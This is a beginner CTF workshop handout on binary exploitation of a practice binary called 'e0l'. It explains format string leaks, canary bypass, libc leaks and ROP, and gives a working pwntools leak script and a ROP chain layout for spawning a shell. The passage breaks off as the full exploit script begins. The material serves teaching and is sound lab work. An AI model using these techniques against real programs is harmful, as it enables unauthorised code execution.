# GDGOC APU — PWN for Beginners Workshop
**Cyber Security Department | Co-Lead: Low Ze Xuan**

---

## Table of Contents

1. [Introduction](#introduction)
2. [Setup & Tools](#setup--tools)
3. [Background: How a Program Runs](#background-how-a-program-runs)
4. [Theory Part 1](#theory-part-1)
   - [Format String Vulnerability](#1-format-string-vulnerability)
   - [Buffer Overflow](#2-buffer-overflow)
   - [Stack Canary](#3-stack-canary)
   - [Libc & The Libc Leak](#4-libc--the-libc-leak)
5. [Hands-on Part 1 — Analysing the Binary & Leaking Secrets](#hands-on-part-1--analysing-the-binary--leaking-secrets)
6. [Theory Part 2](#theory-part-2)
   - [Return-Oriented Programming (ROP)](#1-return-oriented-programming-rop)
   - [Stack Alignment](#2-stack-alignment)
7. [Hands-on Part 2 — Building the Full Exploit](#hands-on-part-2--building-the-full-exploit)
8. [Quick Reference](#quick-reference)

---

## Introduction

Welcome to the GDGOC APU PWN for Beginners Workshop!

**PWN** (binary exploitation) is a category in CTF (Capture The Flag) competitions where you are given a compiled program and your job is to find vulnerabilities in it, then exploit those vulnerabilities to take control of the program — usually to read a secret flag file on the server.

**What we will cover today:**

| Topic | Why it matters |
|-------|---------------|
| Format String Vulnerability | Leaks secret values from memory |
| Buffer Overflow | Lets us overwrite the return address |
| Stack Canary | A protection we need to bypass |
| Libc Leak | Lets us find where `system()` lives in memory |
| Return-Oriented Programming (ROP) | How to execute code when the stack is non-executable |
| Stack Alignment | A subtle requirement to make `system()` work |

**Goal of this workshop:** Not to make you an expert in one session, but to give you a solid mental model of how these attacks work and spark your interest to explore more.

**Prerequisites assumed:**
- Basic Python
- Basic understanding of CPU registers (rax, rsp, rbp, rip, rdi…)
- Basic understanding of what assembly instructions do

---

## Setup & Tools

### Tools Used Today

| Tool | Purpose |
|------|---------|
| `pwntools` | Python library for writing exploits |
| `checksec` | Check what security protections a binary has |
| `ROPgadget` | Find ROP gadgets inside a binary |
| `objdump` | Disassemble a binary to read its assembly |
| `file` | Identify what kind of file something is |
| `pwninit` | Automatically patch a binary to use the provided libc |
| `readelf` | Read ELF binary information (symbols, sections, etc.) |

### Installing pwntools

```bash
pip install pwntools
```

### Your Challenge Files

```
e0l_patched               ← The binary to exploit (patched to use provided libc)
e0l                       ← Original unpatched binary
libc.so.6                 ← The libc the server uses
ld-linux-x86-64.so.2      ← Dynamic linker (loader)
exploit.py                ← Exploit template
```

> **Why is there a `_patched` version?**
> In CTF challenges, the server runs a specific version of libc which may differ from yours.
> `pwninit` patches the binary to use the exact libc provided, so when you find offsets locally they
> will match the remote server.

### Navigate to your folder

```bash
cd ~/Desktop/GDGOC_APU_PWN_WORKSHOP
ls
```

---

## Background: How a Program Runs

Before we talk about vulnerabilities, you need to understand **how a running program is laid out in memory**, specifically the **stack**.

### Virtual Memory Layout

When a program runs, the OS gives it a virtual address space. It looks roughly like this (simplified):

```
Address Space (0x7FFFFFFFFFFF)
┌───────────────────────────────────────┐
│            Kernel Space               │  ← Restricted (Top of memory)
├───────────────────────────────────────┤
│               Stack                   │  ← Grows DOWN (Starts ~0x7ffffff...)
├───────────────────────────────────────┤
│                 ↓                     │
│           (Large Gap)                 │  ← Randomly sized via ASLR
│                 ↑                     │
├───────────────────────────────────────┤
│         Memory Mapping Segment        │  ← Shared Libs (libc.so), mmap(),
│   (also grows DOWN in modern Linux)   │    Thread Stacks, etc.
├───────────────────────────────────────┤
│                 ↑                     │
│               Heap                    │  ← Grows UP (via brk/sbrk)
├───────────────────────────────────────┤
│           BSS (Uninit Data)           │  ← Globals set to zero
├───────────────────────────────────────┤
│          Data (Init Data)             │  ← Globals with explicit values
├───────────────────────────────────────┤
│          Text (Code / ELF)            │  ← Your compiled instructions
└───────────────────────────────────────┘
Low Address (0x0000...)
```

### The Stack

The **stack** is the most important area for binary exploitation. It is used to:
- Store **local variables** (like `char buffer[64]`)
- Store the **return address** (where to go after a function finishes)
- Store the **saved base pointer** (the caller's RBP value)

Think of the stack like a stack of paper trays in a cafeteria — you put new trays on top, and take from the top. The technical terms are:
- **PUSH** — put something on top of the stack (RSP decreases)
- **POP** — take something off the top of the stack (RSP increases)

> The stack **grows downward** — when you push data, the stack pointer (RSP) moves to a **lower** address.

### Stack Frame

Every time a function is called, it creates a **stack frame** — a region of the stack that belongs to that function:

```
┌─────────────────────────────────┐  ← High address
│        ...caller's frame...     │
├─────────────────────────────────┤
│       return address            │  ← pushed when function was called (where to return to)
│       saved RBP                 │  ← saved base pointer of the caller
│       [canary]                  │  ← stack protection value (explained later)
│       local variable 1          │
│       local variable 2          │
│       buffer[0..63]             │  ← grows downward inside the frame
└─────────────────────────────────┘  ← RSP points here (top of stack = lowest address)
```

### Key Registers

| Register | Full Name | Purpose |
|----------|-----------|---------|
| `RSP` | Stack Pointer | Points to the **top** of the stack (lowest used address) |
| `RBP` | Base Pointer | Points to the **base** of the current stack frame |
| `RIP` | Instruction Pointer | Address of the **next instruction** to execute |
| `RDI` | — | **1st argument** when calling a function (64-bit Linux calling convention) |
| `RSI` | — | 2nd argument |
| `RDX` | — | 3rd argument |

### Why the Return Address is Critical

When a function is called, the CPU automatically **pushes the return address** onto the stack. When the function finishes executing the `ret` instruction, the CPU **pops that address** and jumps to it.

**If we can overwrite the return address → we control where the program jumps to next.**

This is the core idea behind buffer overflow exploitation.

---

## Theory Part 1

---

### 1. Format String Vulnerability

#### What is `printf`?

`printf` is a standard C function that prints formatted output. You give it a **format string** as the first argument, and it interprets special placeholders called **format specifiers** inside it.

```c
int age = 21;
char name[] = "Alice";
printf("Hello %s, you are %d years old\n", name, age);
// Output: Hello Alice, you are 21 years old
```

The format string `"Hello %s, you are %d years old\n"` tells `printf`:
- `%s` → print the next argument as a string
- `%d` → print the next argument as a decimal number

#### Common Format Specifiers

| Specifier | What it does |
|-----------|-------------|
| `%s` | Print as string |
| `%d` | Print as decimal integer |
| `%x` | Print as hexadecimal (no prefix) |
| `%p` | Print as pointer — hexadecimal with `0x` prefix, always 8 bytes wide on 64-bit |
| `%n` | **Write** the number of bytes printed so far into the pointed-to address (dangerous!) |

#### Positional Specifiers

`printf` also supports **positional arguments**: `%N$p` means "print the Nth argument as a pointer".

```c
printf("%1$p %2$p %3$p", a, b, c);
// Prints a, then b, then c as pointers

printf("%3$p %1$p", a, b, c);
// Prints c, then a (out of order)
```

This is powerful: you can pick **any specific argument** directly.

#### How Arguments are Passed in 64-bit Linux

In 64-bit Linux (System V AMD64 ABI), function arguments are passed like this:

- Argument 1 → `RDI` register (for `printf`, this is the format string itself)
- Argument 2 → `RSI` register
- Argument 3 → `RDX` register
- Argument 4 → `RCX` register
- Argument 5 → `R8` register
- Argument 6 → `R9` register
- Argument 7 onwards → pushed onto the **stack**

So when `printf` runs out of registers, it reads the remaining arguments **from the stack** in order.

#### The Vulnerability

The vulnerability arises when a programmer passes user-controlled input **directly as the format string** instead of as data:

```c
char buffer[128];
read(0, buffer, 128);   // read user input into buffer

// SAFE — user input is treated as data, never interpreted
printf("%s", buffer);

// VULNERABLE — user input becomes the format string itself!
printf(buffer);
```

When `printf(buffer)` is called with no extra arguments:
- If you enter `Hello` → it prints `Hello` (harmless)
- If you enter `%p` → it reads the next "argument" (which doesn't exist!) and prints whatever is on the stack at that position
- If you enter `%p%p%p%p%p%p%p` → it reads and prints 7 values off the stack

In other words, you are **tricking `printf` into reading memory it wasn't supposed to**.

#### How This Lets Us Read the Stack

The stack at the time `printf` is called contains:
- Saved registers from function calls
- Local variables from the current and caller's stack frames
- **The stack canary** (secret protection value)
- **Return addresses** pointing into libc

By sending enough `%p` specifiers, we can read all of these values.

#### A Handy Trick: Positional Arguments

Instead of counting through many `%p`s to reach position 23, we can directly target it:

```
%23$p   ← read the 23rd argument (which maps to a specific stack slot)
```

We will use this to precisely extract the canary and a libc address in the hands-on section.

#### Why This Is Dangerous

- **Read** any value on the stack → leak canary, libc address, return addresses
- **Write** to arbitrary memory addresses using `%n` (advanced topic, not covered today)

---

### 2. Buffer Overflow

#### What is a Buffer?

A buffer is a fixed-size region of memory allocated to hold data:

```c
char buffer[64];   // a buffer that can store exactly 64 bytes
```

The key word is **fixed-size**. The programmer allocates exactly 64 bytes. The memory beyond those 64 bytes belongs to something else — like the canary, saved RBP, or return address.

#### What is a Buffer Overflow?

A **buffer overflow** happens when you write **more data than the buffer can hold**. The extra bytes spill over into the adjacent memory, overwriting whatever was there.

Example of vulnerable code:

```c
char buffer[64];
read(0, buffer, 512);   // reads up to 512 bytes, but buffer is only 64!
```

If you send 100 bytes:
- First 64 bytes go into `buffer`
- Bytes 65–72 overwrite the **canary**
- Bytes 73–80 overwrite the **saved RBP**
- Bytes 81–88 overwrite the **return address**

#### Why Overwriting the Return Address Matters

When the function ends, it executes `ret`, which pops the return address off the stack and jumps to it. If we replaced it with an address we control, **we decide where execution goes next**.

#### Visual: Stack Before and After Overflow

```
BEFORE overflow (normal):
┌────────────────────────────────┐  ← RBP-0x50 (buffer starts here)
│ buffer[0..63]     64 bytes     │
│ [8 bytes padding] 8 bytes      │  ← alignment padding added by compiler
│ canary            8 bytes      │  ← secret random value
│ saved RBP         8 bytes      │  ← caller's base pointer
│ return address    8 bytes      │  ← where to go after function returns
└────────────────────────────────┘

AFTER overflow with bad input (72 'A's + junk):
┌────────────────────────────────┐
│ AAAA...AAAA       72 bytes     │  ← fills buffer + padding
│ XXXXXXXX          8 bytes      │  ← CANARY OVERWRITTEN → crash!
│ XXXXXXXX          8 bytes      │  ← saved RBP overwritten
│ 0x????????        8 bytes      │  ← return address overwritten
└────────────────────────────────┘
```

> We need exactly **72 bytes** to reach the canary in this challenge.
> `(0x50 - 0x08) = 0x48 = 72` bytes — calculated from the disassembly.

#### Why We Need to Preserve the Canary

If we just send 100 `'A'` bytes, the canary gets overwritten with `'AAAAAAAA'`. The program will detect this and call `__stack_chk_fail()`, aborting before our return address is ever reached.

The fix: **leak the canary first**, then write it back correctly during the overflow.

---

### 3. Stack Canary

#### What is a Canary and Why is it Called That?

In the 19th century, coal miners used to bring **canaries** into mines. If there was toxic gas, the canary would die first, warning the miners to evacuate. A stack canary works the same way — it's a **sentinel value** that dies (triggers an alarm) if the stack is corrupted.

When a function with a canary starts:
1. A random secret value is loaded from thread-local storage (`%fs:0x28`)
2. That value is stored on the stack, just above the local variables

Before the function returns:
1. The canary value is read back from the stack
2. It is compared to the original value in TLS
3. If they match → proceed normally
4. If they differ → call `__stack_chk_fail()` → **abort!**

#### Stack Layout with Canary

```c
// Source
void execute_payload() {
    char buffer[64];
    read(0, buffer, 512);  // overflow here!
}
```

```
// What the compiler actually produces:
rbp - 0x50  ← buffer[0]  (our input starts here)
    ...
rbp - 0x09  ← buffer[63] (last byte of buffer)
rbp - 0x08  ← CANARY     (8 bytes)
rbp + 0x00  ← saved RBP  (8 bytes)
rbp + 0x08  ← return address
```

Distance from buffer start to canary = `0x50 - 0x08 = 0x48 = 72 bytes`

#### Key Properties of the Canary

- It is **random** — generated at program startup, different every run (because of ASLR)
- It **always ends in a null byte** (`\x00`) — this stops `scanf` and `gets` from reading past it (because those functions stop at null)
- It is **identical across all stack frames in the same process** — because all frames read from the same TLS location (`%fs:0x28`)

> **Important:** Because all frames in the same process share the same canary, leaking it from `diagnostics()` gives us the canary for `execute_payload()` too!

#### How to Bypass the Canary

You cannot just overwrite the canary with garbage — that triggers the check.

The strategy is:
1. **Leak the canary value** using the format string vulnerability in `diagnostics()`
2. When building the overflow payload in `execute_payload()`, **write the correct canary value back** in its original position

```
Overflow payload:
┌──────────────────────────────────┐
│  'A' * 72                        │  ← fill buffer + padding up to canary
│  <leaked_canary_value>  8 bytes  │  ← put the correct value back → check passes!
│  p64(0)                 8 bytes  │  ← overwrite saved RBP (any value works)
│  <our ROP chain>                 │  ← overwrite return address → we control execution
└──────────────────────────────────┘
```

---

### 4. Libc & The Libc Leak

#### What is libc?

**libc** (the C Standard Library) is a shared library that provides implementations of standard C functions:

| Function | What it does |
|----------|-------------|
| `printf` | Formatted printing |
| `read` | Read from file descriptor |
| `puts` | Print a string |
| `malloc` / `free` | Heap memory management |
| `system` | **Execute a shell command** ← we want this! |
| `exit` | Exit the process |

Almost every Linux program uses libc. It is loaded into the process's memory at runtime as a shared object (`.so` file).

The function we want to call is:
```c
system("/bin/sh");  // spawns an interactive shell!
```

#### What is the Libc Base Address?

When libc is loaded into memory, it is loaded at a **base address**. All functions inside libc live at:

```
function_address = libc_base + function_offset
```

The **offset** of each function within libc is fixed — it never changes for a given version of libc. For example, in our provided `libc.so.6`:

```
system() is always at:  libc_base + 0x50d70
"/bin/sh" is always at: libc_base + 0x1d8678
```

So if we know `libc_base`, we can calculate exactly where `system()` is.

#### What is ASLR?

**ASLR — Address Space Layout Randomization** is a defence built into the Linux kernel. Every time a program runs, it loads libc at a **different random base address**:

```
Run 1: libc_base = 0x7f3a12000000   → system() at 0x7f3a12050d70
Run 2: libc_base = 0x7f9b45000000   → system() at 0x7f9b45050d70
Run 3: libc_base = 0x7faa11000000   → system() at 0x7faa11050d70
```

We cannot hardcode `system()`'s address because it is different every run.

#### Why Does libc_base Always End in `000`?

Memory is managed in **pages** of exactly 4096 bytes (0x1000). Libraries are always loaded at the start of a page, so `libc_base` is always a multiple of 0x1000. In hex, that means the last 3 digits are always `000`:

```
0x7f3a12000000  ← last 3 digits: 000 ✓
0x7f9b45001234  ← last 3 digits: 234 ✗ (this would be wrong)
```

You can use this as a **sanity check**: if your calculated libc_base doesn't end in `000`, your offset is wrong.

#### Why Do libc Addresses Start with `0x7f`?

On 64-bit Linux, the kernel typically loads shared libraries in the upper part of user space, which falls in the range `0x7f0000000000` to `0x7fffffffffff`. So every address inside libc (and the stack) starts with `0x7f`. This is how you visually identify libc addresses on the stack.

#### How to Calculate libc_base

The format string vulnerability can leak a **specific address stored on the stack** that belongs to libc — for example, a return address from `__libc_start_call_main` that `main` was called from.

At format string offset 33, we consistently get a libc address that is exactly `libc_base + 0x29d90`. So:

```python
libc_base = leaked_value_at_offset_33 - 0x29d90
```

Once we have `libc_base`:

```python
system_address = libc_base + 0x50d70          # or use libc.sym["system"] in pwntools
binsh_address  = libc_base + 0x1d8678         # or use next(libc.search(b"/bin/sh"))
```

---

## Hands-on Part 1 — Analysing the Binary & Leaking Secrets

Now let's put everything together with the actual challenge: **`e0l`**.

### Step 1: What Kind of File Is It?

```bash
file e0l_patched
```

Expected output:
```
e0l_patched: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter ./ld-linux-x86-64.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, not stripped
```

Breaking this down piece by piece:

| Part | Meaning |
|------|---------|
| `ELF` | Executable and Linkable Format — the standard binary format on Linux |
| `64-bit` | This is a 64-bit binary (registers are 64-bit wide, addresses are 8 bytes) |
| `LSB` | Little-Endian byte order. In memory, `0x12345678` is stored as `78 56 34 12`. pwntools handles this for you with `p64()` |
| `x86-64` | CPU architecture — standard Intel/AMD desktop architecture |
| `dynamically linked` | The binary uses shared libraries (like libc.so.6) that are loaded at runtime |
| `interpreter ./ld-linux-x86-64.so.2` | The dynamic linker/loader that loads those shared libraries |
| `not stripped` | Debug symbols are still present — function names like `diagnostics`, `execute_payload` are visible in the binary |

---

### Step 2: Check Security Protections

```bash
checksec --file=e0l_patched
```

Expected output:
```
RELRO           STACK CANARY      NX            PIE             RUNPATH
Partial RELRO   Canary found      NX enabled    No PIE          RW-RUNPATH
```

#### What Does Each Protection Mean?

**RELRO — Relocation Read-Only**

| Value | Meaning |
|-------|---------|
| `No RELRO` | The GOT (Global Offset Table — a table of pointers to library functions) is fully writable |
| `Partial RELRO` | Some sections are read-only after startup, but the GOT is still writable |
| `Full RELRO` | The entire GOT is made read-only after startup — harder to exploit |

We have **Partial RELRO**. The GOT is still writable, which could be used in advanced attacks (GOT overwrite). Not needed today.

---

**STACK CANARY — Stack Protection**

| Value | Meaning |
|-------|---------|
| `No canary found` | No stack protection — buffer overflows go undetected |
| `Canary found` | A random secret value guards the return address — must be bypassed |

We have **Canary found**. We must leak the canary value before doing the overflow.

---

**NX — No Execute (a.k.a. DEP)**

| Value | Meaning |
|-------|---------|
| `NX disabled` | The stack is executable — we could inject and run shellcode directly |
| `NX enabled` | The stack is **not** executable — we cannot run shellcode we inject |

We have **NX enabled**. We cannot inject shellcode. Instead, we use ROP (Return-Oriented Programming) to reuse existing code in the binary and libc.

---

**PIE — Position Independent Executable**

| Value | Meaning |
|-------|---------|
| `PIE enabled` | The binary itself is loaded at a random address every run (like ASLR for the binary) |
| `No PIE` | The binary is always loaded at the **same fixed address** every run |

We have **No PIE**. This means addresses inside the binary (like gadgets in the `.text` section) are always the same. We can hardcode them. For example, there is always a `ret` gadget at `0x40101a`.

---

### Step 3: Run the Binary and Explore

```bash
./e0l_patched
```

You should see:
```
CYNX Terminal v2.1
System Status: DEGRADED

[MENU]
1. Diagnostics
2. Execute
3. Exit
>
```

Try each option:
- **Option 1** → Asks for a "Command" → this is the `diagnostics()` function → **format string vulnerability here**
- **Option 2** → Asks for a "Payload" → this is the `execute_payload()` function → **buffer overflow here**
- **Option 3** → Exit

---

### Step 4: Confirm the Format String Vulnerability

Let's verify the vulnerability exists. Type `1`, then for the command enter `%p`:

```
> 1
Command: %p
0x1
```

Instead of printing the literal text `%p`, it printed a memory address! This confirms `printf(buffer)` is being called with our input as the format string.

Try a few more:
```
> 1
Command: %p %p %p
0x1 0x1 0x6
```

Each `%p` reads the next value off the stack.

---

### Step 5: Dump the Stack with Many `%p`s

Now let's send a large number of `%p.` format specifiers to dump a big chunk of the stack. We separate them with `.` so we can count positions easily.

```
> 1
Command: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
```

You will get a long output like this (values change every run due to ASLR):

```
0x1.0x1.0x4.0x402060.(nil).0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.
0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.
0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.
0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.
0x70252e70252e7025.0x7f...1040.(0xe91edee22c9b6200).(0x7ffc...).0x4014c0.
(nil).0x100000000.0xa31.(nil).(nil).(0xe91edee22c9b6200).0x1.(0x7f...29d90).
(nil).0x4013e9.0x100000000...
```

#### What Do We See?

Count each value from the start (separated by `.`):

| Position | Value (example) | What it is |
|----------|----------------|------------|
| 1–5 | `0x1`, `0x1`, `0x4`, `0x402060`, `(nil)` | Register values and binary addresses |
| 6–21 | `0x70252e70252e7025`... | **Your own input reflected back!** `%p.` in hex ASCII |
| 22 | `0x7f...1040` | libc / ld address |
| **23** | `0xe91edee22c9b6200` | **CANARY** — notice it ends in `00`! |
| 24 | `0x7ffc...` | Stack address |
| 25 | `0x4014c0` | Binary address (inside `main`) |
| 26–30 | various | Other values |
| **31** | `0xe91edee22c9b6200` | **CANARY again** — same value, from `main()`'s stack frame |
| 32 | `0x1` | — |
| **33** | `0x7f...29d90` | **Libc address** — starts with `0x7f`! |

#### Understanding Why You See Your Input (Positions 6–21)

This is a fascinating quirk! Your `buffer` is stored on the **stack**. When `printf` starts reading "arguments" off the stack, it eventually reaches the area where your buffer lives. At that point, it reads your own input back as if it were values!

The repeating pattern `0x70252e70252e7025` decodes to ASCII:
- `0x70` = `'p'`
- `0x25` = `'%'`
- `0x2e` = `'.'`

Reading right to left (little-endian): `%p.%p.%p.` — that's your own format string being printed back! This is called **reading the format string from the stack**, and it's a beautiful demonstration of why the vulnerability is so powerful.

#### Identifying the Canary

Look for a value that:
1. Is 8 bytes long (16 hex digits after `0x`)
2. **Ends in `00`** — e.g., `0x????????????????????????00`
3. Is **not** a binary address (doesn't start with `0x40` or `0x00`)

In our output: position **23** fits perfectly → that is the **canary**.

You will also notice position **31** has the **exact same value** as position 23. That's because:
- Position 23 = the canary stored in `diagnostics()`'s own stack frame
- Position 31 = the canary stored in `main()`'s stack frame
- They are identical because all stack frames in the same process share one canary value (from `%fs:0x28` in TLS)

#### Identifying the Libc Address

Look for a value that:
1. Starts with `0x7f` (in the upper user-space range)
2. Is consistently present at the same position across runs

Position **33** fits — it's always `libc_base + 0x29d90`.

---

### Step 6: Confirm With Targeted Leaks

Now that we know the positions, we can target them directly using positional format specifiers. This is cleaner for our exploit script:

```
> 1
Command: %23$p|%33$p
```

You'll get something like:
```
0xd3ac9d5b62541e00|0x7f08a5629d90
```

- `0xd3ac9d5b62541e00` → **canary** (note the trailing `00`)
- `0x7f08a5629d90` → **libc address** at offset `libc_base + 0x29d90`

To calculate `libc_base`:
```
libc_base = 0x7f08a5629d90 - 0x29d90 = 0x7f08a5600000
```

Notice the result ends in `000` — that's our sanity check that the offset is correct.

---

### Step 7: Write a Leak Script

Let's automate the leak in Python. Save this as `leak.py`:

```python
#!/usr/bin/env python3
from pwn import *

# Load the binary and libc
elf  = ELF('./e0l_patched', checksec=False)
libc = ELF('./libc.so.6',   checksec=False)
context.binary = elf

# Start the process
p = process('./e0l_patched')

# ── Step 1: Trigger the format string vulnerability ────────────────────────────
p.sendlineafter(b'> ', b'1')                  # choose option 1 (diagnostics)
p.sendlineafter(b'Command: ', b'%23$p|%33$p') # leak position 23 (canary) and 33 (libc)

# ── Step 2: Parse the leak ─────────────────────────────────────────────────────
output = p.recvline().decode().strip()
print(f'[*] Raw output: {output}')

parts     = output.split('|')
canary    = int(parts[0], 16)   # convert hex string to integer
libc_leak = int(parts[1], 16)

# ── Step 3: Calculate libc base ────────────────────────────────────────────────
# The value at position 33 is always libc_base + 0x29d90
libc.address = libc_leak - 0x29d90

log.success(f'Canary:    {hex(canary)}')
log.success(f'Libc base: {hex(libc.address)}')

# ── Sanity check ───────────────────────────────────────────────────────────────
assert hex(libc.address).endswith('000'), "libc_base doesn't end in 000 — offset may be wrong!"
assert hex(canary).endswith('00'),        "Canary doesn't end in 00 — offset may be wrong!"

log.success(f'system(): {hex(libc.sym["system"])}')

p.close()
```

Run it:
```bash
python3 leak.py
```

Expected output:
```
[*] Raw output: 0xd3ac9d5b62541e00|0x7f08a5629d90
[+] Canary:    0xd3ac9d5b62541e00
[+] Libc base: 0x7f08a5600000
[+] system(): 0x7f08a5650d70
```

---

## Theory Part 2

---

### 1. Return-Oriented Programming (ROP)

#### Why We Can't Just Inject Shellcode

**Shellcode** is hand-crafted machine code that does something useful — like spawning a shell. In the early days of exploitation, attackers would inject shellcode into a buffer and then redirect execution to it.

**NX (No Execute)** kills this approach. With NX enabled, the stack (and heap) are marked as **non-executable** in the hardware page tables. If the CPU is told to execute code at a non-executable address, it raises a fault and the program crashes.

So we need a different approach: instead of injecting our **own** code, we **reuse code that already exists** in the binary and libc. This is Return-Oriented Programming.

#### The Core Idea of ROP

Every function in a program eventually executes a `ret` instruction. `ret` pops an 8-byte address off the stack and jumps to it.

A **ROP gadget** is a short sequence of instructions ending with `ret`. For example:

```asm
pop rdi
ret
```

This gadget:
1. Pops the top value off the stack into register `rdi`
2. Then `ret` — pops the next value off the stack and jumps to it

The trick is: **we control the stack** (via buffer overflow). So we can place a series of gadget addresses on the stack, one after another. Each gadget executes its instructions, then `ret` jumps to the next gadget address we placed.

This is called a **ROP chain** — a chain of gadgets that together perform a useful action.

#### The Goal: Call `system("/bin/sh")`

In 64-bit Linux, the **first argument** to any function is passed in the `RDI` register. So to call:

```c
system("/bin/sh");
```

We need:
1. `RDI` = address of the string `"/bin/sh"` in memory
2. Then jump to `system()`

The string `"/bin/sh"` already exists inside libc (libc uses it internally). We just need its address.

#### Finding Gadgets with ROPgadget

```bash
# Find pop rdi; ret inside libc
ROPgadget --binary libc.so.6 --only "pop|ret" | grep "pop rdi"
```

Output:
```
0x000000000002a3e5 : pop rdi ; ret
```

This is the **offset** of the gadget inside libc. The actual runtime address = `libc_base + 0x2a3e5`.

```bash
# Find the /bin/sh string inside libc
ROPgadget --binary libc.so.6 --string "/bin/sh"
```

Output:
```
0x00000000001d8678 : /bin/sh
```

Again, an offset. Runtime address = `libc_base + 0x1d8678`.

```bash
# Find system() in the libc symbol table
readelf -s libc.so.6 | grep " system"
```

Output:
```
1481: 0000000000050d70    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
```

Runtime address = `libc_base + 0x50d70`.

#### Building the ROP Chain — Step by Step

After our overflow, we control everything on the stack from the return address onwards. Here is what we place there:

```
Stack (from return address onwards):
┌────────────────────────────────┐
│  address of (ret gadget)       │  ← for stack alignment (explained next)
├────────────────────────────────┤
│  address of (pop rdi; ret)     │  ← RIP jumps here
├────────────────────────────────┤
│  address of "/bin/sh"          │  ← pop rdi pops this into RDI
├────────────────────────────────┤
│  address of system()           │  ← ret of pop rdi jumps here
└────────────────────────────────┘
```

Execution flow:

1. `execute_payload` finishes → `ret` → jumps to `ret` gadget
2. `ret` gadget → adjusts stack alignment → `ret` → jumps to `pop rdi; ret`
3. `pop rdi` → pops `/bin/sh` address off the stack → stores it in `RDI`
4. `ret` → jumps to `system()`
5. `system(RDI)` = `system("/bin/sh")` → **shell spawned!**

---

### 2. Stack Alignment

#### What is Stack Alignment?

The **System V AMD64 ABI** (the set of rules that defines how 64-bit Linux programs call functions) has a requirement:

> **The stack pointer (RSP) must be 16-byte aligned at the moment a function is called.**

"16-byte aligned" means `RSP % 16 == 0` — the stack pointer must be a multiple of 16.

#### Why Does This Requirement Exist?

Modern processors have SIMD (Single Instruction, Multiple Data) instructions — like `movaps` — that can process 16 bytes at a time. These instructions **require** their memory operands to be 16-byte aligned. Libc internally uses these instructions (in `system()`, `printf()`, etc.), so it requires the stack to be properly aligned when called.

If the stack is misaligned, `movaps` raises a General Protection Fault and the program crashes with a signal 11 (SIGSEGV) or signal 4 (SIGILL). This can cause your exploit to fail even when the logic is perfectly correct!

#### How Does Misalignment Happen During ROP?

Every `call` instruction pushes an 8-byte return address onto the stack. This shifts RSP by 8 bytes. Before any function call, RSP starts aligned (multiple of 16). After `call`, RSP becomes `multiple of 16 - 8`, which is **8 bytes off**.

Normally, the function's prologue (`push rbp`) fixes this by pushing another 8 bytes. But in a ROP chain, we skip function prologues and jump directly into the middle of code. The alignment can easily be off.

#### How to Fix It: The `ret` Trick

A `ret` instruction pops 8 bytes off the stack (advancing RSP by 8) and jumps to that address. Inserting a lone `ret` gadget into your ROP chain before calling a function **shifts RSP by 8**, potentially restoring alignment.

```bash
# Find a simple ret gadget in the binary
# No PIE means this address is fixed every run!
ROPgadget --binary e0l_patched --only "ret" | head -5
```

Output:
```
0x000000000040101a : ret
```

We insert `0x40101a` as the first gadget in our ROP chain. It does nothing except `ret` — but that 8-byte RSP adjustment is exactly what we need.

#### Visual: Alignment Fix

```
WITHOUT the ret gadget (RSP misaligned → crash):
│ return addr slot │ ← overwritten with pop rdi gadget
│ /bin/sh addr     │
│ system()         │ ← RSP misaligned here → movaps CRASH!

WITH the ret gadget (RSP aligned → works):
│ return addr slot │ ← overwritten with ret gadget (0x40101a)
│ pop rdi gadget   │ ← RSP corrected here
│ /bin/sh addr     │
│ system()         │ ← RSP aligned → system() works!
```

---

## Hands-on Part 2 — Building the Full Exploit

### Step 1: Understanding `execute_payload`'s Stack Layout

Let's look at the disassembly of `execute_payload` to understand the exact sizes:

```bash
objdump -d e0l_patched | grep -A 30 "<execute_payload>:"
```

Key lines:
```asm
sub $0x50, %rsp          ; allocate 0x50 = 80 bytes on stack
mov %fs:0x28, %rax       ; load canary from thread-local storage
mov %rax, -0x8(%rbp)     ; store canary at rbp - 0x8
lea -0x50(%rbp), %rax    ; buffer starts at rbp - 0x50
mov $0x200, %edx         ; read up to 0x200 = 512 bytes
call read@plt            ; read(0, buffer, 512) ← OVERFLOW!
```

From this we can map the stack frame:

```
rbp - 0x50  ← buffer starts here  (our input)
rbp - 0x09  ← buffer ends here    (last byte)
rbp - 0x08  ← CANARY (8 bytes)
rbp + 0x00  ← saved RBP (8 bytes)
rbp + 0x08  ← return address (8 bytes)
```

**Distance from buffer start to canary:**
```
0x50 - 0x08 = 0x48 = 72 (decimal)
```

We need exactly **72 bytes** of padding before placing the canary.

---

### Step 2: Find All Gadget Addresses

```bash
# Alignment ret gadget (from binary — fixed address because No PIE)
ROPgadget --binary e0l_patched --only "ret" | head -5
```
```
0x000000000040101a : ret
```

```bash
# pop rdi; ret (from libc — offset from libc_base)
ROPgadget --binary libc.so.6 --only "pop|ret" | grep "pop rdi"
```
```
0x000000000002a3e5 : pop rdi ; ret
```

```bash
# /bin/sh string (from libc — offset from libc_base)
ROPgadget --binary libc.so.6 --string "/bin/sh"
```
```
0x00000000001d8678 : /bin/sh
```

```bash
# system() (from libc symbol table)
readelf -s libc.so.6 | grep " system"
```
```
1481: 0000000000050d70    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
```

**Gadget Summary:**

| Gadget | Location | Address |
|--------|----------|---------|
| `ret` (alignment) | Binary (fixed, No PIE) | `0x40101a` |
| `pop rdi; ret` | libc offset | `libc_base + 0x2a3e5` |
| `"/bin/sh"` string | libc offset | `libc_base + 0x1d8678` |
| `system()` | libc symbol | `libc_base + 0x50d70` |

---

### Step 3: Write the Full Exploit

Save this as `exploit.py`:

```python
#!/usr/bin/env python3
from pwn import *

# ── Setup ──────────────────────────────────────────────────────────────────────
elf  = ELF('./e0l_patched', checksec=False)  # load binary (checksec=False suppresses output)
libc = ELF('./libc.so.6',   checksec=False)  # load libc
context.binary = elf                          # tells pwntools the architecture (x86-64)
